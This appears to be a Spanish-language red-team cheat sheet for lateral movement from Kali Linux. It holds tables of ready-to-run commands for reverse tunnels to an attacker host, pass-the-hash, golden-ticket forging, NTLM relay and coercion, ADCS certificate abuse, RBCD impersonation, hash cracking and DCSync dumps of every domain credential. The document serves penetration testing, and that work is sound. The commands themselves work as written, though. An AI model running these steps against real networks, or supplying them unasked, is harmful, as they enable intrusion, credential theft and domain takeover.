# Herramientas de Lateral Movement — CLI Kali Linux

Pivoting de red, autenticación lateral (PtH/PtT/Kerberos), NTLM Relay,
ADCS abuse, AD domain admin path. Tras `internal_network_audit` y
`post_exploitation`.

---

## 1. Network Pivoting (SOCKS / port-forward / tunneling)

| Herramienta | Instalación | Comando de ejemplo |
|---|---|---|
| **ssh -D (SOCKS5 dinámico)** | Preinstalado | `ssh -D 1080 user@pivot-host -N` (luego `proxychains4 ...`) |
| **ssh -L (forward local)** | Preinstalado | `ssh -L 8080:internal:80 user@pivot -N` |
| **ssh -R (reverse forward)** | Preinstalado | `ssh -R 4444:localhost:80 user@attacker` |
| **chisel (server)** | `go install github.com/jpillora/chisel@latest` | (atacante) `chisel server -p 8000 --reverse --auth user:pass` |
| **chisel (client reverse)** | Idem | (target) `chisel client http://attacker:8000 R:1080:socks` |
| **ligolo-ng (server)** | release github | (atacante) `./proxy -selfcert -laddr 0.0.0.0:11601` |
| **ligolo-ng (agent)** | Idem | (target) `./agent -connect ATTACKER:11601 -ignore-cert` |
| **socat (port forward)** | `sudo apt install socat` | `socat TCP-LISTEN:8080,fork TCP:internal:80` |
| **sshuttle (VPN-like)** | `sudo apt install sshuttle` | `sshuttle -r user@pivot 10.10.10.0/24` |
| **revsocks** | `git clone https://github.com/kost/revsocks` | reverse SOCKS5 (alternativa a chisel) |
| **proxychains4** | Preinstalado | `proxychains4 nmap -sT 10.10.20.10` |
| **iodine (DNS tunneling)** | `sudo apt install iodine` | server: `iodined -P pass 10.0.0.1 tun.atk.tld`; client: `iodine -P pass tun.atk.tld` |
| **dnscat2 (DNS C2)** | `git clone https://github.com/iagox86/dnscat2` | server + client (cubierto en red_team_ops) |
| **gost** | `go install github.com/go-gost/gost/cmd/gost@latest` | `gost -L=:1080 -F=ssh://user:pass@pivot:22` (multi-protocol) |

---

## 2. Pass-the-Hash (PtH)

| Herramienta | Instalación | Comando de ejemplo |
|---|---|---|
| **netexec smb (PtH)** | Preinstalado | `netexec smb 10.10.10.0/24 -u admin -H aad3b435b51404eeaad3b435b51404ee:<NTLM>` |
| **netexec winrm (PtH)** | Idem | `netexec winrm 10.10.10.20 -u admin -H :<NTLM>` |
| **netexec mssql (PtH)** | Idem | `netexec mssql 10.10.10.30 -u sa -H :<NTLM>` |
| **evil-winrm (PtH)** | Preinstalado | `evil-winrm -i 10.10.10.20 -u admin -H <NTLM>` |
| **impacket-psexec (PtH)** | Preinstalado | `impacket-psexec admin@10.10.10.20 -hashes :<NTLM>` |
| **impacket-smbexec (PtH)** | Preinstalado | `impacket-smbexec admin@10.10.10.20 -hashes :<NTLM>` |
| **impacket-wmiexec (PtH)** | Preinstalado | `impacket-wmiexec admin@10.10.10.20 -hashes :<NTLM>` |
| **impacket-dcomexec (PtH)** | Preinstalado | `impacket-dcomexec admin@10.10.10.20 -hashes :<NTLM>` |
| **impacket-atexec (PtH)** | Preinstalado | `impacket-atexec -hashes :<NTLM> admin@10.10.10.20 "whoami"` |
| **rpcclient (PtH)** | Preinstalado | `rpcclient -U admin --pw-nt-hash <NTLM> 10.10.10.20` |
| **smbclient (PtH)** | Preinstalado | `smbclient -U admin --pw-nt-hash <NTLM> //10.10.10.20/c$` |
| **xfreerdp (PtH)** | Preinstalado | `xfreerdp /v:10.10.10.20 /u:admin /pth:<NTLM> /cert:ignore` |

---

## 3. Pass-the-Ticket (PtT) y Overpass-the-Hash (OPtH)

| Herramienta | Instalación | Comando de ejemplo |
|---|---|---|
| **impacket-getTGT (OPtH)** | Preinstalado | `impacket-getTGT corp.local/user -hashes :<NTLM> -dc-ip 10.10.10.10` |
| **impacket-getST** | Preinstalado | `impacket-getST -spn cifs/dc01.corp.local -impersonate Administrator corp.local/svc:<pw>` |
| **export KRB5CCNAME** | Built-in | `export KRB5CCNAME=user.ccache; netexec smb dc01 -u user -k --use-kcache` |
| **klist / kdestroy** | Preinstalado | `klist` (lista tickets); `kdestroy` (purge) |
| **ticketer (Silver/Golden)** | Preinstalado | `impacket-ticketer -nthash <krbtgt-hash> -domain-sid S-1-5-21-... -domain corp.local Administrator` |
| **Rubeus (.NET, en target)** | release github | `Rubeus.exe asktgt /user:u /password:p /domain:corp.local`, `kerberoast`, `s4u`, `purge` |
| **PowerSploit Invoke-Kerberoast** | git | `Invoke-Kerberoast -OutputFormat Hashcat \| Out-File k.txt` |

---

## 4. NTLM Relay y Coercion

| Herramienta | Instalación | Comando de ejemplo |
|---|---|---|
| **impacket-ntlmrelayx (relay → SMB)** | Preinstalado | `impacket-ntlmrelayx -t smb://10.10.10.40 -smb2support` |
| **impacket-ntlmrelayx (relay → LDAPS)** | Preinstalado | `impacket-ntlmrelayx -t ldaps://dc01 --escalate-user lowpriv` |
| **impacket-ntlmrelayx (ADCS ESC8)** | Preinstalado | `impacket-ntlmrelayx -t http://ca01.corp.local/certsrv/certfnsh.asp --adcs --template DomainController` |
| **impacket-ntlmrelayx (MSSQL)** | Preinstalado | `impacket-ntlmrelayx -t mssql://10.10.10.30 -i` (interactive) |
| **Responder (capture)** | Preinstalado | `responder -I eth0 -Av` (LLMNR/NBT-NS/MDNS poisoning) |
| **Inveigh (Windows .NET)** | release github | `Inveigh.exe -ConsoleOutput Y -SpoofIP <attacker>` |
| **mitm6 (DHCPv6 spoof)** | `pip install mitm6 --break-system-packages` | `mitm6 -d corp.local` (junto a ntlmrelayx) |

### Coercion (forzar auth NTLM desde host)

| Herramienta | Instalación | Comando de ejemplo |
|---|---|---|
| **PetitPotam** | `git clone https://github.com/topotam/PetitPotam` | `python3 PetitPotam.py -d corp.local -u user -p pass <attacker-ip> <dc-ip>` |
| **Coercer** | `pip install coercer --break-system-packages` | `coercer coerce -t 10.10.10.10 -l <attacker> -u user -p pass -d corp.local` |
| **printerbug (SpoolSample)** | `git clone https://github.com/dirkjanm/krbrelayx` | `python3 printerbug.py corp.local/user:pass@dc01 attacker-ip` |
| **dfscoerce** | `git clone https://github.com/Wh04m1001/DFSCoerce` | `python3 dfscoerce.py -u user -p pass -d corp.local <attacker-ip> <target-ip>` |
| **shadowcoerce** | `git clone https://github.com/ShutdownRepo/ShadowCoerce` | `python3 shadowcoerce.py -u user -p pass <attacker> <target>` |
| **MS-EFSR (efs-coerce)** | Idem PetitPotam | sinónimo de PetitPotam |

---

## 5. ADCS (Active Directory Certificate Services) Abuse

| Herramienta | Instalación | Comando de ejemplo |
|---|---|---|
| **certipy find (recon)** | `pip install certipy-ad --break-system-packages` | `certipy find -u user@corp.local -p pass -dc-ip 10.10.10.10 -vulnerable -enabled` |
| **certipy req (ESC1/4)** | Idem | `certipy req -u user@corp.local -p pass -ca CA01 -template VulnTemplate -upn administrator@corp.local` |
| **certipy auth (cert → TGT)** | Idem | `certipy auth -pfx admin.pfx -dc-ip 10.10.10.10` |
| **certipy relay (ESC8)** | Idem | `certipy relay -ca http://ca01.corp.local/certsrv/certfnsh.asp` |
| **Certify (.NET)** | release github | `Certify.exe find /vulnerable; Certify.exe request /ca:CA /template:V` |
| **adcsabuser** | `pip install adcsabuser --break-system-packages` | wrapper python sobre certipy |

---

## 6. Active Directory — Tools (overlap con `internal_network_audit`)

| Herramienta | Instalación | Comando de ejemplo |
|---|---|---|
| **bloodhound-python (re-run)** | Preinstalado | `bloodhound-python -d corp.local -u newuser -p pass -c All -ns 10.10.10.10 --zip` |
| **netexec --shares / --pass-pol / --users** | Preinstalado | ya cubierto en internal_network_audit |
| **ldapdomaindump** | Preinstalado | `ldapdomaindump -u corp\\user -p pass dc01 -o ldd/` |
| **bloodyAD** | `pip install bloodyAD --break-system-packages` | `bloodyAD -u user -p pass -d corp.local --host dc01 add user newuser P@ss123!` |
| **pywerview** | `pip install pywerview --break-system-packages` | `pywerview get-netuser -u user -p pass -d corp.local --dc-ip dc01` |
| **adidnsdump** | `pip install git+https://github.com/dirkjanm/adidnsdump --break-system-packages` | `adidnsdump -u corp\\user -p pass dc01` |
| **PowerView (Windows target)** | release github | en target: `Get-NetUser`, `Find-LocalAdminAccess`, `Find-DomainShare` |

---

## 7. RBCD (Resource-Based Constrained Delegation)

| Herramienta | Instalación | Comando de ejemplo |
|---|---|---|
| **impacket-addcomputer** | Preinstalado | `impacket-addcomputer -computer-name 'EVIL$' -computer-pass 'P@ss123!' -dc-ip dc01 corp.local/user:pass` |
| **bloodyAD set RBCD** | Idem §6 | `bloodyAD --host dc01 -d corp.local -u user -p pass set rbcd target$ EVIL$` |
| **impacket-getST (S4U)** | Preinstalado | `impacket-getST -spn cifs/target.corp.local -impersonate Administrator -dc-ip dc01 corp.local/EVIL$:'P@ss123!'` |
| **rbcd.py (Charlie)** | `git clone https://github.com/tothi/rbcd-attack` | `python3 rbcd.py -dc-ip dc01 -t target -f EVIL$ -p P@ss corp.local/user:pass` |

---

## 8. Hash Cracking en lateral (creds capturadas)

| Herramienta | Instalación | Comando de ejemplo |
|---|---|---|
| **hashcat (NTLM)** | Preinstalado | `hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt -r best64.rule` |
| **hashcat (NetNTLMv2)** | Preinstalado | `hashcat -m 5600 netntlmv2.hash rockyou.txt -r best64.rule` |
| **hashcat (Kerberos)** | Preinstalado | `hashcat -m 13100 kerb.hash rockyou.txt -r best64.rule` (TGS-REP) |
| **hashcat (AS-REP)** | Preinstalado | `hashcat -m 18200 asrep.hash rockyou.txt -r best64.rule` |
| **hashcat (MS Cache v2)** | Preinstalado | `hashcat -m 2100 mscachev2.hash rockyou.txt` |
| **john (multi)** | Preinstalado | `john --wordlist=rockyou.txt --format=netntlmv2 hash.txt` |
| **ssh2john** | Preinstalado | `ssh2john id_rsa > id_rsa.hash; john --wordlist=rockyou.txt id_rsa.hash` |

---

## 9. SSH Lateral (Linux)

| Herramienta | Instalación | Comando de ejemplo |
|---|---|---|
| **find SSH keys** | Built-in | `find / -name "id_rsa*" -o -name "*.pem" -readable 2>/dev/null` |
| **known_hosts mining** | Built-in | `cat ~/.ssh/known_hosts \| awk '{print $1}' \| cut -d, -f1` |
| **ssh-audit (per-host)** | `pip install ssh-audit --break-system-packages` | `ssh-audit 10.10.10.30` (auth methods enum) |
| **ssh con key** | Built-in | `ssh -i id_rsa -o StrictHostKeyChecking=no user@10.10.10.30` |
| **paramiko bulk script** | `pip install paramiko --break-system-packages` | python loop para intentar key/pass reuse |

---

## 10. RDP Lateral

| Herramienta | Instalación | Comando de ejemplo |
|---|---|---|
| **xfreerdp (con creds)** | Preinstalado | `xfreerdp /v:10.10.10.20 /u:admin /p:'P@ss' /cert:ignore /workarea` |
| **xfreerdp (restricted admin)** | Preinstalado | `xfreerdp /v:... /u:admin /pth:<NTLM> /restricted-admin /cert:ignore` |
| **rdesktop** | Preinstalado | `rdesktop 10.10.10.20 -u admin -p pass` (legacy) |
| **netexec rdp** | Preinstalado | `netexec rdp 10.10.10.0/24 -u admin -p pass --continue-on-success` |
| **xrdp + remmina** | GUI | para sesiones complejas |
| **rdp-sec-check** | `git clone https://github.com/portcullislabs/rdp-sec-check` | `perl rdp-sec-check.pl 10.10.10.20` |

---

## 11. WMI / WinRM Lateral

| Herramienta | Instalación | Comando de ejemplo |
|---|---|---|
| **impacket-wmiexec** | Preinstalado | `impacket-wmiexec corp/admin:pass@10.10.10.20` |
| **wmic (Windows nativo)** | Built-in | `wmic /node:10.10.10.20 /user:admin /password:pass process call create "cmd.exe /c notepad.exe"` |
| **evil-winrm** | Preinstalado | `evil-winrm -i 10.10.10.20 -u admin -p pass -s scripts/ -e exec/` |
| **PowerShell remoting (Enter-PSSession)** | nativo | `Enter-PSSession -ComputerName 10.10.10.20 -Credential (Get-Credential)` |
| **netexec winrm -X / -M** | Idem | `netexec winrm 10.10.10.20 -u admin -p pass -X 'whoami /priv'` |

---

## 12. DCSync / Credentials Dump del DC

| Herramienta | Instalación | Comando de ejemplo |
|---|---|---|
| **impacket-secretsdump (DCSync)** | Preinstalado | `impacket-secretsdump corp/admin:pass@dc01 -just-dc-user krbtgt` |
| **impacket-secretsdump (full)** | Preinstalado | `impacket-secretsdump corp/admin:pass@dc01 -just-dc-ntlm` (todos los users) |
| **mimikatz lsadump::dcsync** | release github | (en target Windows) `lsadump::dcsync /user:corp\krbtgt /domain:corp.local` |
| **netexec --ntds** | Preinstalado | `netexec smb dc01 -u admin -p pass --ntds` (auto-dump) |

---

## Resumen de Disponibilidad

| Estado | Cantidad |
|---|---|
| **Preinstalado en Kali (impacket suite + netexec)** | ~25 |
| **Instalable con pip** | ~10 |
| **Go install** | ~5 |
| **Git clone / release** | ~15 |
| **Total** | **~55 herramientas** |

---

## Alcance

Movimiento lateral en AD + Linux + pivoting de red. Tras
`internal_network_audit` (recon AD inicial) y `post_exploitation`
(creds locales). Antes de `red_team_ops` (full kill chain).
